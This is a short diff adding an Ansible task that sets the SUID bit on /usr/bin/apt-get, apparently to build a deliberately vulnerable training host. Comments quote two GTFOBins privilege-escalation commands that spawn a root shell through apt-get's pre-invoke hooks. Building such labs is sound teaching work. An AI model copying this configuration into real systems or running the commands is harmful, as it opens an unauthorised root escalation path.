@@ -1,0 +1,9 @@
+---
+# GTFOBins: https://gtfobins.github.io/gtfobins/apt-get/#suid
+# Exploit (method 1): apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+# Exploit (method 2): echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >/tmp/x && apt-get -y install -c /tmp/x sl
+- name: (privesc/suid_apt_get) Set SUID bit on /usr/bin/apt-get
+  ansible.builtin.file:
+    path: /usr/bin/apt-get
+    owner: root
+    mode: "4755"
